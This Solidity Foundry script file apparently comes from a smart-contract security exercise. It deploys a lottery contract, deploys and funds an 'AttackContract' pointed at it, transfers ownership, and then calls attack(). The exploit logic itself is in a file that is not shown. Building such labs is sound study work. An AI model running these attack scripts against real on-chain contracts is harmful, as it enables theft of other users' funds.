// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {YourContract} from "../src/YourContract.sol";
import {AttackContract} from "../src/Attack.sol";

contract SetupScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        YourContract addr = new YourContract(
            payable(0xbd4F35A8c49cBFeE2a721623dD684912dc2d6a19)
        );
        addr.startLottery();
        addr.contribute{value: 40e17}();
        vm.stopBroadcast();
    }
}

contract DeployAttackScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        AttackContract attackContract = new AttackContract(
            address(0x6eE69aE7b2E04Eab5C4be37A13fA9e0378caA5b7)
        );
        payable(address(attackContract)).transfer(15e17);
        vm.stopBroadcast();
    }
}

contract TransferOwnerScript is Script {
    function setUp() public {}

    function run() public {
        YourContract addr = YourContract(
            address(0x331eBA5112cb218977e891D496380a0b653f4071)
        );
        vm.startBroadcast();
        addr.transferOwnership(
            address(0xCd2ee0Ab870503A257904F5485F4eD0510d36c9A)
        );
        vm.stopBroadcast();
    }
}

contract AttackScript is Script {
    function setUp() public {}

    function run() public {
        AttackContract attackContract = AttackContract(
            payable(0xCd2ee0Ab870503A257904F5485F4eD0510d36c9A)
        );
        vm.startBroadcast();
        attackContract.attack();
        vm.stopBroadcast();
    }
}
